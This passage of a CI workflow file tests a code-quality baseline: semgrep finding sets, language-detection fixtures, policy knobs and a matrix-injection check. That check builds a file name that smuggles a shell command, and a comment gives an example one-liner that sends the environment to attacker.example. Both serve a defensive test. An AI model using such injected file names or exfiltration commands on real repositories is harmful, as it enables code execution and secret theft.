                  if isinstance(values, list):
                      legs *= len(values)
              contexts += legs

          # Two documents state the number, for two audiences. Both are checked,
          # because a contributor reading only CONTRIBUTING.md and an agent
          # reading only CLAUDE.md must not be told different things.
          bad = 0
          for doc in ("CLAUDE.md", "CONTRIBUTING.md"):
              found = re.findall(r"(\d+) required checks",
                                 pathlib.Path(doc).read_text())
              if not found:
                  print(f"::error::{doc} no longer states a required-check "
                        "count — this guard stopped guarding")
                  bad = 1
              elif any(int(n) != contexts for n in found):
                  print(f"::error::{doc} says {', '.join(found)} required "
                        f"checks; ci.yml produces {contexts} contexts from "
                        f"{len(jobs)} jobs. Update the docs AND add the missing "
                        "context to branch protection on develop AND main.")
                  bad = 1
          if not bad:
              print(f"OK: {contexts} contexts from {len(jobs)} jobs, "
                    "and both documents agree")
          sys.exit(bad)
          PY

  # Runs on BOTH platforms the action claims to support, because "supported"
  # is a claim about installed tools and shell builtins, and those are exactly
  # what differs: macOS has no `sha256sum`, no pipx on a self-hosted box, no
  # passwordless sudo to assume, and a different release asset (and therefore a
  # different digest) for gitleaks and osv-scanner. A platform table nothing
  # exercises is a platform table that is wrong the first time someone needs it.
  #
  # macos-latest is arm64, which is the row a self-hosted Apple-silicon runner
  # takes — the case this support was added for. Standard runners are free on
  # a public repo, so the second leg costs nothing but wall time.
  #
  # The expected finding set is asserted identically on both: semgrep's rules
  # are platform-independent, so a count that moves between legs is a bug in
  # the install path, not a fact about the OS.
  layer2:
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          fetch-depth: 0
      # Exercises the REAL delivery vehicle (actions/layer2), not a rebuild of
      # its steps — if the composite action breaks, this job breaks.
      - uses: ./actions/layer2
        id: scan
        continue-on-error: true
        with:
          json-out: ${{ runner.temp }}/layer2.json
      - name: The scan must have FAILED, with exactly the expected finding set
        shell: bash
        env:
          OUTCOME: ${{ steps.scan.outcome }}
          SEMGREP: ${{ steps.scan.outputs.semgrep }}
          JSON: ${{ runner.temp }}/layer2.json
        run: |
          set -Eeuo pipefail
          if [[ "$OUTCOME" != 'failure' ]]; then
            echo '::error::Layer 2 scan passed on the bait samples — the ruleset regressed'
            exit 1
          fi

          # `outcome == failure` on its own was the whole assertion, under a
          # step title claiming a specific count. It cannot tell a working gate
          # from a broken one: scan.sh exits 2 when a tool is missing and 3 on a
          # usage error, and both of those printed OK here. So the finding SET
          # is the assertion now, and it comes from the same manifest
          # layer2-counts uses — through the composite action this time, which
          # is the path a consumer actually runs.
          python3 scripts/check-expected.py --tool semgrep \
            --input "$JSON" --expected samples/expected/semgrep.json

          # And the semgrep status output must exist and be honest. A scan whose
          # tool never installed records SKIPPED, which under `no-fail: true`
          # was previously indistinguishable from a clean run.
          case "$SEMGREP" in
            FINDINGS*) ;;
            *) echo "::error::layer2 reported semgrep as '$SEMGREP'; the bait samples must produce FINDINGS"; exit 1 ;;
          esac
          echo "OK: Layer 2 rejected the samples through the composite action, semgrep=$SEMGREP"

  # A consumer's FILENAMES reach quality.yml's matrix, and a matrix value that
  # is interpolated into a run body is code. This job proves the safe form is
  # actually safe, and — the half that matters — that the hostile fixture is
  # genuinely hostile rather than inert.
  #
  # The static guard in workflow-lint catches the pattern. This catches the
  # BEHAVIOUR, so the two fail for different reasons and neither can quietly
  # become a no-op.
  matrix-injection:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: A hostile filename must not become shell
        shell: bash
        run: |
          set -Eeuo pipefail
          ROOT=$PWD
          R=/tmp/hostile; rm -rf "$R"; mkdir -p "$R"; cd "$R"

          # git permits quotes and semicolons in tracked paths, so this is a file
          # a contributor can add in a pull request to a consuming repo.
          #
          # NOTE THE ABSENCE OF SLASHES. A filename cannot contain '/', which
          # rules out the obvious `curl https://host/path | sh` payload — the
          # first version of this test used one and simply failed to create the
          # file. It is not a mitigation: `env|curl attacker.example -d@-` needs
          # no slash and exfiltrates the whole environment. The marker below is
          # the same shape, minus the network.
          touch 'a";touch pwned;".csproj'

          # Exactly the detect step's pipeline from quality.yml.
          targets=$(find . -name node_modules -prune -o -type f -name '*.csproj' -print \
                    | sed 's|^\./||' | jq -R . | jq -sc .)
          echo "detected: $targets"
          T=$(jq -r '.[0]' <<<"$targets")

          # 1. THE FIXTURE MUST BE DANGEROUS. `eval` reproduces what GitHub's
          #    expression substitution does — splice into the script text, then
          #    let bash parse it. If this does NOT create the marker, the
          #    filename is harmless and the assertion below would pass against a
          #    broken guard forever.
          #
          #    (The literal expression syntax is deliberately NOT written out
          #    anywhere in this block. Inside a run: body it is parsed by
          #    actionlint and matched by our own guard — and unlike the
          #    fetch-and-execute check, this guard must NOT get a comment
          #    exemption: substitution happens before bash sees the text, so a
          #    value containing a newline escapes a shell comment into code.)
          rm -f pwned
          eval "printf 'building %s\n' \"$T\"" >/dev/null 2>&1 || true
          if [[ ! -f pwned ]]; then
            echo '::error::the hostile filename did not inject even under eval — the fixture is inert and proves nothing'
            exit 1
          fi
          echo 'OK: fixture is genuinely dangerous (injected under textual substitution)'

          # 2. THE SAFE FORM MUST HOLD. env: passes a value, so bash never
          #    parses the filename as syntax.
          rm -f pwned
          TARGET="$T" bash -c 'printf "building %s\n" "$TARGET"' >/dev/null
          if [[ -f pwned ]]; then
            echo '::error::the env: form executed the filename — passing through env no longer protects the matrix value'
            exit 1
          fi
          echo 'OK: env: form treats the same filename as data'

          cd "$ROOT"
          # 3. And quality.yml must actually USE the safe form for it.
          # `.` stands in for the `$` in both patterns. A literal $ inside
          # single quotes trips SC2016, and this repo is linted by the same
          # actionlint it ships — same dodge as the backticks in the report test.
          if ! grep -qE 'TARGET: .\{\{ matrix\.target \}\}' .github/workflows/quality.yml; then
            echo '::error::quality.yml no longer passes matrix.target through env:'
            exit 1
          fi
          grep -qE 'dotnet build ".TARGET"' .github/workflows/quality.yml || {
            echo '::error::the dotnet build step no longer uses the env variable'; exit 1; }
          echo 'OK: quality.yml passes matrix.target through env:'

  # quality.yml is the file every consumer actually runs, and ci.yml executed
  # none of it. Detection was the worst of that: it is inline in the workflow,
  # so the only way to "test" it was to keep a second copy here — and a copy
  # drifts, which is how the gap below survived to begin with.
  #
  # A yarn or bun repo has package.json and no supported lockfile, so has_ts
  # came back false, every TypeScript job skipped, and the run was green — while
  # scripts/adopt.sh, which keys on package.json, had already told the same repo
  # it was ADOPTED. Same shape for a .sln that omits a project, and for a Python
  # project pinning only requirements-dev.txt.
  #
  # So this job EXTRACTS the detect step's script out of the shipped workflow
  # and runs it verbatim. There is no second copy to drift: edit quality.yml and
  # this job runs the edit.
  detect-fixtures:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: The shipped detect step must classify every fixture, or fail loud
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 -c 'import yaml' 2>/dev/null \
            || python3 -m pip install --quiet --break-system-packages 'pyyaml==6.0.3'
          python3 - <<'PY'
          import yaml
          wf = yaml.safe_load(open('.github/workflows/quality.yml'))
          step = next(s for s in wf['jobs']['detect']['steps'] if s.get('id') == 'scan')
          open('/tmp/detect.sh', 'w').write(step['run'])
          PY

          OUT=/tmp/detect.out
          LOG=/tmp/detect.log
          rc=0
          # A subshell, so the fixture cd never leaks into the next case, and
          # `|| rc=$?` so a deliberate exit 1 is data rather than a dead job.
          run() {
            : > "$OUT"; rc=0
            ( cd "$1" && LANGS="$2" GITHUB_OUTPUT="$OUT" bash /tmp/detect.sh ) > "$LOG" 2>&1 || rc=$?
          }
          val() { sed -n "s/^$1=//p" "$OUT" | tail -1; }
          fail() { echo "::error::$*"; echo '--- log ---'; cat "$LOG"; echo '--- outputs ---'; cat "$OUT"; exit 1; }
          eq() { [[ "$2" == "$3" ]] || fail "$1: got [$2], expected [$3]"; }
          says() { grep -q "$2" "$LOG" || fail "$1: the error never mentioned '$2'"; }

          F=/tmp/fx; rm -rf "$F"; mkdir -p "$F"

          mkdir -p "$F/npm"
          echo '{}' > "$F/npm/package.json"; echo '{}' > "$F/npm/package-lock.json"

          # A workspace member has a package.json and no lockfile of its own.
          # Detection must walk UP to the root rather than call it uncovered.
          mkdir -p "$F/workspace/packages/a"
          echo '{}' > "$F/workspace/package.json"
          echo '{}' > "$F/workspace/package-lock.json"
          echo '{}' > "$F/workspace/packages/a/package.json"

          mkdir -p "$F/yarn"
          echo '{}' > "$F/yarn/package.json"; : > "$F/yarn/yarn.lock"

          mkdir -p "$F/nested/ts"
          echo '{}' > "$F/nested/ts/package.json"; echo '{}' > "$F/nested/ts/pnpm-lock.yaml"

          # The project paths are written with BACKSLASHES on purpose: that is
          # what a .sln carries even when it was written on Linux, so a parser
          # that reads them as-is finds nothing at all.
          sln() {
            local f="$1"; shift
            { echo 'Microsoft Visual Studio Solution File, Format Version 12.00'
              local i=0
              for p in "$@"; do
                i=$((i+1))
                printf 'Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "P%s", "%s", "{%s}"\nEndProject\n' \
                  "$i" "$p" "$i"
              done
            } > "$f"
          }

          mkdir -p "$F/sln-full/src/Api" "$F/sln-full/src/Data"
          : > "$F/sln-full/src/Api/Api.csproj"; : > "$F/sln-full/src/Data/Data.csproj"
          sln "$F/sln-full/Sample.sln" 'src\Api\Api.csproj' 'src\Data\Data.csproj'

          mkdir -p "$F/sln-partial/src/Api" "$F/sln-partial/src/Worker"
          : > "$F/sln-partial/src/Api/Api.csproj"; : > "$F/sln-partial/src/Worker/Worker.csproj"
          sln "$F/sln-partial/Sample.sln" 'src\Api\Api.csproj'

          mkdir -p "$F/sln-nested/build" "$F/sln-nested/src/Api"
          : > "$F/sln-nested/src/Api/Api.csproj"
          sln "$F/sln-nested/build/Sample.sln" '..\src\Api\Api.csproj'

          # The XML solution format (#56). FORWARD slashes on purpose — that is
          # what the .slnx tooling writes, and the .sln fixtures above already
          # prove the backslash path through the shared quoted-csproj
          # extraction. Consumer A is a real instance of this layout: before
          # the glob learned *.slnx, detection fell back to loose csprojs.
          slnx() {
            local f="$1"; shift
            { echo '<Solution>'
              for p in "$@"; do
                printf '  <Project Path="%s" />\n' "$p"
              done
              echo '</Solution>'
            } > "$f"
          }

          mkdir -p "$F/slnx-full/src/Api" "$F/slnx-full/src/Data"
          : > "$F/slnx-full/src/Api/Api.csproj"; : > "$F/slnx-full/src/Data/Data.csproj"
          slnx "$F/slnx-full/Sample.slnx" 'src/Api/Api.csproj' 'src/Data/Data.csproj'

          # The coverage cross-check must guard a .slnx exactly as it guards a
          # .sln — an omitted project is never built, never analysed.
          mkdir -p "$F/slnx-partial/src/Api" "$F/slnx-partial/src/Worker"
          : > "$F/slnx-partial/src/Api/Api.csproj"; : > "$F/slnx-partial/src/Worker/Worker.csproj"
          slnx "$F/slnx-partial/Sample.slnx" 'src/Api/Api.csproj'

          mkdir -p "$F/no-sln/src/A" "$F/no-sln/src/B"
          : > "$F/no-sln/src/A/A.csproj"; : > "$F/no-sln/src/B/B.csproj"

          mkdir -p "$F/py-dev"; : > "$F/py-dev/requirements-dev.txt"

          # Rust (#70). A plain binary crate with its lockfile committed.
          mkdir -p "$F/rust-bin"
          printf '[package]\nname = "a"\n' > "$F/rust-bin/Cargo.toml"
          : > "$F/rust-bin/Cargo.lock"

          # A cargo workspace: only the ROOT carries Cargo.lock while every
          # member carries a manifest — the same walk-up the TS fixture proves.
          mkdir -p "$F/rust-ws/crates/a" "$F/rust-ws/crates/b"
          printf '[workspace]\nmembers = ["crates/*"]\n' > "$F/rust-ws/Cargo.toml"
          : > "$F/rust-ws/Cargo.lock"
          printf '[package]\nname = "a"\n' > "$F/rust-ws/crates/a/Cargo.toml"
          printf '[package]\nname = "b"\n' > "$F/rust-ws/crates/b/Cargo.toml"

          # THE BUG SHAPE, one level down from #70 itself: a crate clippy
          # cannot open, because `--locked` refuses to run without a lockfile.
          mkdir -p "$F/rust-nolock"
          printf '[package]\nname = "a"\n' > "$F/rust-nolock/Cargo.toml"

          # A crate the workspace's `members` list omits. It sits under the
          # root's Cargo.lock so it LOOKS covered, and `cargo clippy` at the
          # root analyses members only — the sln-partial case above, in Cargo's
          # spelling, and the reason this branch parses TOML rather than globs.
          mkdir -p "$F/rust-orphan/crates/a" "$F/rust-orphan/crates/b"
          printf '[workspace]\nmembers = ["crates/a"]\n' > "$F/rust-orphan/Cargo.toml"
          : > "$F/rust-orphan/Cargo.lock"
          printf '[package]\nname = "a"\n' > "$F/rust-orphan/crates/a/Cargo.toml"
          printf '[package]\nname = "b"\n' > "$F/rust-orphan/crates/b/Cargo.toml"

          # Cargo auto-promotes a path dependency inside the workspace
          # directory to a member, so `members` never naming it is normal and
          # flagging it would hard-fail a legitimate repo. Transitive on
          # purpose: crates/a is a member, libs/util is only reachable through
          # it.
          mkdir -p "$F/rust-pathdep/crates/a" "$F/rust-pathdep/libs/util"
          printf '[workspace]\nmembers = ["crates/a"]\n' > "$F/rust-pathdep/Cargo.toml"
          : > "$F/rust-pathdep/Cargo.lock"
          printf '[package]\nname = "a"\n\n[dependencies]\nutil = { path = "../../libs/util" }\n' \
            > "$F/rust-pathdep/crates/a/Cargo.toml"
          printf '[package]\nname = "util"\n' > "$F/rust-pathdep/libs/util/Cargo.toml"

          # `exclude` is the consumer saying "not part of this build" — a
          # deliberate statement, and the same class of answer as passing
          # languages: without rust.
          mkdir -p "$F/rust-excluded/crates/a" "$F/rust-excluded/vendor/old"
          printf '[workspace]\nmembers = ["crates/a"]\nexclude = ["vendor/old"]\n' \
            > "$F/rust-excluded/Cargo.toml"
          : > "$F/rust-excluded/Cargo.lock"
          printf '[package]\nname = "a"\n' > "$F/rust-excluded/crates/a/Cargo.toml"
          printf '[package]\nname = "old"\n' > "$F/rust-excluded/vendor/old/Cargo.toml"

          mkdir -p "$F/rust-nested/svc"
          printf '[package]\nname = "a"\n' > "$F/rust-nested/svc/Cargo.toml"
          : > "$F/rust-nested/svc/Cargo.lock"

          # target/ holds manifests cargo vendored during a build. They are not
          # the repo's code, and a matrix entry per vendored crate would be an
          # analysis of somebody else's source.
          mkdir -p "$F/rust-target/target/pkg"
          printf '[package]\nname = "a"\n' > "$F/rust-target/Cargo.toml"
          : > "$F/rust-target/Cargo.lock"
          printf '[package]\nname = "v"\n' > "$F/rust-target/target/pkg/Cargo.toml"
          : > "$F/rust-target/target/pkg/Cargo.lock"

          # Java (#10). A single-module Maven project carrying the lint region.
          mkdir -p "$F/mvn"
          printf '<project><modelVersion>4.0.0</modelVersion><!-- maxi-quality:begin --><!-- maxi-quality:end --></project>\n' \
            > "$F/mvn/pom.xml"

          # An aggregator and its modules. Only the ROOT is a matrix unit:
          # <build><plugins> is inherited by modules, and one entry per module
          # would build the same reactor N times. The .sln-preference shape, in
          # Maven's spelling.
          mkdir -p "$F/mvn-multi/mod-a" "$F/mvn-multi/mod-b"
          printf '<project><modelVersion>4.0.0</modelVersion><modules><module>mod-a</module><module>mod-b</module></modules><!-- maxi-quality:begin --><!-- maxi-quality:end --></project>\n' \
            > "$F/mvn-multi/pom.xml"
          printf '<project><modelVersion>4.0.0</modelVersion></project>\n' > "$F/mvn-multi/mod-a/pom.xml"
          printf '<project><modelVersion>4.0.0</modelVersion></project>\n' > "$F/mvn-multi/mod-b/pom.xml"

          # THE BUG SHAPE. A pom with no lint region builds perfectly and
          # analyses nothing — `mvn compile` green over code Error Prone never
          # opened. That is the whole failure this baseline exists to prevent,
          # so it stops the run rather than reducing the scan.
          mkdir -p "$F/mvn-unwired"
          printf '<project><modelVersion>4.0.0</modelVersion></project>\n' > "$F/mvn-unwired/pom.xml"

          # Gradle: v1 is Maven-only, and "no Java here" is a lie about a repo
          # that plainly has some. Same class as the yarn lockfile above.
          mkdir -p "$F/gradle"
          : > "$F/gradle/build.gradle.kts"

          mkdir -p "$F/mvn-nested/svc"
          printf '<project><modelVersion>4.0.0</modelVersion><!-- maxi-quality:begin --><!-- maxi-quality:end --></project>\n' \
            > "$F/mvn-nested/svc/pom.xml"

          run "$F/npm" auto
          eq 'npm rc' "$rc" 0
          eq 'npm ts_dirs' "$(val ts_dirs)" '["."]'
          eq 'npm has_ts' "$(val has_ts)" true

          run "$F/workspace" auto
          eq 'workspace rc' "$rc" 0
          eq 'workspace ts_dirs' "$(val ts_dirs)" '["."]'

          # THE BUG. Before the fix this returned rc 0 with has_ts=false.
          run "$F/yarn" auto
          eq 'yarn rc' "$rc" 1
          says 'yarn' 'yarn.lock'

          # ...and it must stay escapable, or the fix is a new way to be stuck.
          run "$F/yarn" none
          eq 'yarn+none rc' "$rc" 0
          eq 'yarn+none has_ts' "$(val has_ts)" false
          run "$F/yarn" dotnet
          eq 'yarn+dotnet rc' "$rc" 0
          eq 'yarn+dotnet has_ts' "$(val has_ts)" false

          run "$F/nested" auto
          eq 'nested rc' "$rc" 0
          eq 'nested ts_dirs' "$(val ts_dirs)" '["ts"]'

          run "$F/sln-full" auto
          eq 'sln-full rc' "$rc" 0
          eq 'sln-full targets' "$(val dotnet_targets)" '["Sample.sln"]'

          run "$F/sln-partial" auto
          eq 'sln-partial rc' "$rc" 1
          says 'sln-partial' 'Worker.csproj'

          run "$F/sln-nested" auto
          eq 'sln-nested rc' "$rc" 0
          eq 'sln-nested targets' "$(val dotnet_targets)" '["build/Sample.sln"]'

          run "$F/slnx-full" auto
          eq 'slnx-full rc' "$rc" 0
          eq 'slnx-full targets' "$(val dotnet_targets)" '["Sample.slnx"]'

          run "$F/slnx-partial" auto
          eq 'slnx-partial rc' "$rc" 1
          says 'slnx-partial' 'Worker.csproj'

          run "$F/no-sln" auto
          eq 'no-sln rc' "$rc" 0
          eq 'no-sln targets' "$(val dotnet_targets)" '["src/A/A.csproj","src/B/B.csproj"]'

          run "$F/py-dev" auto
          eq 'py-dev rc' "$rc" 0
          eq 'py-dev has_python' "$(val has_python)" true
          eq 'py-dev python_dirs' "$(val python_dirs)" '["."]'

          run "$F/rust-bin" auto
          eq 'rust-bin rc' "$rc" 0
          eq 'rust-bin rust_dirs' "$(val rust_dirs)" '["."]'
          eq 'rust-bin has_rust' "$(val has_rust)" true

          run "$F/rust-ws" auto
          eq 'rust-ws rc' "$rc" 0
          eq 'rust-ws rust_dirs' "$(val rust_dirs)" '["."]'

          run "$F/rust-nolock" auto
          eq 'rust-nolock rc' "$rc" 1
          says 'rust-nolock' 'Cargo.lock'

          # ...and it must stay escapable, or the fix is a new way to be stuck.
          run "$F/rust-nolock" none
          eq 'rust-nolock+none rc' "$rc" 0
          eq 'rust-nolock+none has_rust' "$(val has_rust)" false
          run "$F/rust-nolock" ts
          eq 'rust-nolock+ts rc' "$rc" 0
          eq 'rust-nolock+ts has_rust' "$(val has_rust)" false

          run "$F/rust-orphan" auto
          eq 'rust-orphan rc' "$rc" 1
          says 'rust-orphan' 'crates/b'

          run "$F/rust-pathdep" auto
          eq 'rust-pathdep rc' "$rc" 0
          eq 'rust-pathdep rust_dirs' "$(val rust_dirs)" '["."]'

          run "$F/rust-excluded" auto
          eq 'rust-excluded rc' "$rc" 0
          eq 'rust-excluded rust_dirs' "$(val rust_dirs)" '["."]'

          run "$F/rust-nested" auto
          eq 'rust-nested rc' "$rc" 0
          eq 'rust-nested rust_dirs' "$(val rust_dirs)" '["svc"]'

          run "$F/rust-target" auto
          eq 'rust-target rc' "$rc" 0
          eq 'rust-target rust_dirs' "$(val rust_dirs)" '["."]'

          # A repo with no Rust must not grow a Rust job.
          run "$F/npm" auto
          eq 'npm has_rust' "$(val has_rust)" false
          eq 'npm rust_dirs' "$(val rust_dirs)" '[]'

          run "$F/mvn" auto
          eq 'mvn rc' "$rc" 0
          eq 'mvn java_dirs' "$(val java_dirs)" '["."]'
          eq 'mvn has_java' "$(val has_java)" true

          run "$F/mvn-multi" auto
          eq 'mvn-multi rc' "$rc" 0
          eq 'mvn-multi java_dirs' "$(val java_dirs)" '["."]'

          run "$F/mvn-nested" auto
          eq 'mvn-nested rc' "$rc" 0
          eq 'mvn-nested java_dirs' "$(val java_dirs)" '["svc"]'

          run "$F/mvn-unwired" auto
          eq 'mvn-unwired rc' "$rc" 1
          says 'mvn-unwired' 'maxi-quality lint region'

          # ...and it must stay escapable, or the fix is a new way to be stuck.
          run "$F/mvn-unwired" none
          eq 'mvn-unwired+none rc' "$rc" 0
          eq 'mvn-unwired+none has_java' "$(val has_java)" false
          run "$F/mvn-unwired" ts
          eq 'mvn-unwired+ts rc' "$rc" 0
          eq 'mvn-unwired+ts has_java' "$(val has_java)" false

          run "$F/gradle" auto
          eq 'gradle rc' "$rc" 1
          says 'gradle' 'MAVEN-ONLY'

          run "$F/gradle" none
          eq 'gradle+none rc' "$rc" 0
          eq 'gradle+none has_java' "$(val has_java)" false

          # A repo with no Java must not grow a Java job.
          run "$F/npm" auto
          eq 'npm has_java' "$(val has_java)" false
          eq 'npm java_dirs' "$(val java_dirs)" '[]'

          # And this repo itself, which is the workspace shape in miniature:
          # a root lockfile with two sample package.json files under it, plus
          # the three crates — every one of which must carry its own lockfile,
          # because that is exactly what this baseline now asks of consumers.
          run "$GITHUB_WORKSPACE" auto
          eq 'self rc' "$rc" 0
          eq 'self ts_dirs' "$(val ts_dirs)" '["."]'
          eq 'self has_rust' "$(val has_rust)" true
          eq 'self rust_dirs' "$(val rust_dirs)" '["examples/rust-cli","samples/rust","samples/rust-clean"]'
          eq 'self has_java' "$(val has_java)" true
          eq 'self java_dirs' "$(val java_dirs)" '["examples/java-maven","samples/java","samples/java-clean","samples/java-lint"]'

          echo 'OK: every detection fixture classified, and the two silent skips now fail loud'

  # The counts, asserted precisely — semgrep JSON, no fragile CLI-output greps.
  layer2-counts:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Every expected finding fires, and every defined rule id is alive
        shell: bash
        run: |
          set -Eeuo pipefail
          pipx install semgrep==1.172.0

          # This job invokes semgrep DIRECTLY rather than through scan.sh, so it
          # has to resolve the same policy scan.sh would — otherwise the two
          # disagree about what is in scope and this job asserts a finding set
          # nobody actually runs. That is the "semgrep is pinned twice" problem
          # in a different costume, and the fix is the same: one source of
          # truth. Here it is the repo's own .maxi-quality.yml, which excludes
          # samples/policy so the policy fixtures cannot shift this manifest.
          python3 scripts/policy.py resolve --target . --baseline . \
            --baseline-path . --out /tmp/policy.json
          ARGS=()
          while IFS= read -r line; do ARGS+=("$line"); done < <(
            python3 scripts/policy.py args --resolved /tmp/policy.json \
              --baseline-path . --target-path .)
          semgrep "${ARGS[@]}" --json --metrics=off --disable-version-check \
            > /tmp/results.json || true

          # The set assertion. This is what a bare total could not do: a rule
          # branch can be deleted and another finding appear in its place with
          # the total unmoved, which is exactly how the single-quote SQL gap
          # stayed green at 28/19 (STATUS §4). check-expected.py also refuses a
          # run whose `.errors` is non-empty — a semgrep that failed to load a
          # rule reports `results: []`, which is otherwise indistinguishable
          # from a clean tree.
          python3 scripts/check-expected.py --tool semgrep \
            --input /tmp/results.json --expected samples/expected/semgrep.json

          # The dead-rule guard, kept: it asks a different question — not "did
          # the expected findings fire?" but "does every rule we ship fire at
          # all?". A new rule with no fixture is caught here and nowhere else.
          # The pattern tolerates any leading indentation; the old `'^  - id:'`
          # counted only ids indented exactly two spaces.
          fired=$(jq -r '.results[].check_id' /tmp/results.json | sort -u | wc -l)
          defined=$(grep -rhE '^[[:space:]]*- id:' semgrep/ | wc -l)
          echo "fired_ids=$fired defined_ids=$defined"
          [[ "$fired" -eq "$defined" ]] || {
            echo "::error::$defined rule ids defined but only $fired fire — a rule has no fixture"
            exit 1; }
          echo "OK: expected findings match, all $defined defined rule ids fire"

  # The policy file's own test suite. Every knob is asserted in BOTH directions:
  # the fixture with its policy, and the same fixture with the policy removed.
  #
  # The second half is the one that matters and it is not theoretical. The
  # `exclude` fixture originally excluded a directory called `vendor/`, which
  # semgrep skips by default anyway — so it passed while proving nothing, and
  # only ablation showed the finding count was 1 either way. Same trap as
  # docs/STATUS.md §4's `noImplicitReturns` fixture that actually failed on
  # `strictNullChecks`: a fixture proves *an* outcome, never *which setting
  # caused it*.
  policy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Install semgrep and PyYAML
        shell: bash
        run: |
          set -Eeuo pipefail
          pipx install semgrep==1.172.0
          python3 -c 'import yaml' 2>/dev/null \
            || python3 -m pip install --quiet --break-system-packages 'pyyaml==6.0.3'
          python3 -c 'import yaml'

      - name: Every invalid policy is rejected, and none of them is a warning
        shell: bash
        run: |
          set -Eeuo pipefail
          fail=0
          for d in samples/policy/invalid/*/; do
            rc=0
            out=$(python3 scripts/policy.py resolve --target "$d" \
                    --baseline . --baseline-path . 2>&1) || rc=$?
            if [[ "$rc" -ne 3 ]]; then
              echo "::error::$d was accepted (exit $rc) — an invalid policy must be fatal"
              fail=1
              continue
            fi
            # An error that does not name the offending key is a bad error.
            grep -qi 'error:' <<<"$out" || {
              echo "::error::$d failed without an 'error:' message"; fail=1; }
            printf '  rejected  %-18s %s\n' "$(basename "$d")" "$(head -1 <<<"$out" | cut -c1-96)"
          done
          [[ "$fail" -eq 0 ]]
          echo 'OK: every invalid policy is a hard error'

      - name: Each knob works — and removing it brings the finding back
        shell: bash
        run: |
          set -Eeuo pipefail

          # gate count for a fixture, with its policy in place or ablated away
          gate() {
            ./scripts/scan.sh "samples/policy/$1" --skip gitleaks --skip osv 2>&1 \
              | sed -n 's/^semgrep_gate=//p' | tail -1
          }
          warns() {
            ./scripts/scan.sh "samples/policy/$1" --skip gitleaks --skip osv 2>&1 \
              | sed -n 's/^semgrep_warn=//p' | tail -1
          }
          rules() {
            ./scripts/scan.sh "samples/policy/$1" --skip gitleaks --skip osv 2>&1 \
              | grep -oE '❯+❱ [A-Za-z0-9_.-]+' | sed 's/.*\.//' | sort -u | tr '\n' ' '
          }
          ablate()  { mv "samples/policy/$1/.maxi-quality.yml" "$RUNNER_TEMP/$1.yml"; }
          restore() { mv "$RUNNER_TEMP/$1.yml" "samples/policy/$1/.maxi-quality.yml"; }
          eq() {
            [[ "$2" == "$3" ]] || { echo "::error::$1: expected '$3', got '$2'"; exit 1; }
            echo "  OK  $1 = $2"
          }

          # --- disable: the named rule goes quiet, the control still fires ----
          eq 'disable/gate'          "$(gate disable)"  '1'
          eq 'disable/rules'         "$(rules disable)" 'todo-without-issue '
          ablate disable
          eq 'disable/ablated-gate'  "$(gate disable)"  '2'
          eq 'disable/ablated-rules' "$(rules disable)" 'no-ambient-clock todo-without-issue '
          restore disable

          # --- warn: reported, counted separately, and NOT gating -------------
          eq 'warn/gate'             "$(gate warn)"     '0'
          eq 'warn/warn'             "$(warns warn)"    '1'
          rc=0
          ./scripts/scan.sh samples/policy/warn --skip gitleaks --skip osv >/dev/null 2>&1 || rc=$?
          eq 'warn/exit'             "$rc"              '0'
          ablate warn
          eq 'warn/ablated-gate'     "$(gate warn)"     '1'
          restore warn

          # --- exclude: the path is out of scope, everything else is not ------
          eq 'exclude/gate'          "$(gate exclude)"  '1'
          ablate exclude
          eq 'exclude/ablated-gate'  "$(gate exclude)"  '2'
          restore exclude

          # --- extends: the consumer's own rule runs alongside the baseline ---
          eq 'extends/gate'          "$(gate extends)"  '1'
          eq 'extends/rules'         "$(rules extends)" 'local-no-direct-process-env '
          ablate extends
          eq 'extends/ablated-gate'  "$(gate extends)"  '0'
          restore extends

          # --- groups: an unselected group stops applying ---------------------
          eq 'groups/gate'           "$(gate groups)"   '1'
          eq 'groups/rules'          "$(rules groups)"  'weak-crypto '
          ablate groups
          eq 'groups/ablated-gate'   "$(gate groups)"   '2'
          restore groups

          echo 'OK: every policy knob is load-bearing in both directions'

      - name: The resolved policy matches its snapshot
        shell: bash
        run: |
          set -Eeuo pipefail
          # What the policy RESOLVES to, not what the file says — the same
          # division of labour as configs/*/…snapshot.json. A rule deleted from
          # semgrep/ changes gate_rules here even if no fixture triggered it.
          # --baseline-path is a fixed placeholder so the snapshot does not
          # encode whoever ran it last: the check_id prefix is derived from that
          # path, so a real one would bake in a home directory.
          {
            for d in samples/policy/*/; do
              n=$(basename "$d")
              case "$n" in invalid|expected) continue ;; esac
              echo "=== $n"
              python3 scripts/policy.py resolve --target "$d" --baseline . \
                --baseline-path BASELINE --explain
            done
          } > "$RUNNER_TEMP/resolved.txt"
          diff -u samples/policy/expected/resolved.txt "$RUNNER_TEMP/resolved.txt" || {
            echo '::error::the resolved policy drifted from its snapshot'
            exit 1; }
          echo 'OK: resolved policy matches samples/policy/expected/resolved.txt'

      # --- #43: a file semgrep cannot read vs a scan that failed -------------
      #
      # These were the same thing — any non-empty `.errors` exited 2 — and a
      # real C# codebase using C# 12 primary constructors turned a clean scan
      # into a red gate. Both halves are asserted, because the fix is wrong in
      # a different way if either one is missing: gate on parse errors and the
      # check gets ignored; never gate and a repo semgrep cannot read at all
      # reports clean forever.
      - name: An unparseable file is a coverage gap, not a scan failure
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          out=$(./scripts/scan.sh samples/parse-errors/mixed \
                  --skip gitleaks --skip osv 2>&1) || rc=$?
          echo "$out"
          # exit 1 = the PLANTED FINDING gated. Not exit 2, which is what the
          # unparseable file next to it used to produce.
          [[ "$rc" -eq 1 ]] || {
            echo "::error::expected exit 1 (the planted finding), got $rc"; exit 1; }
          # The control. Without a real finding here, "clean, 1 unparsed" cannot
          # be told apart from "semgrep fell over and reported nothing".
          eq() { [[ "$2" == "$3" ]] || {
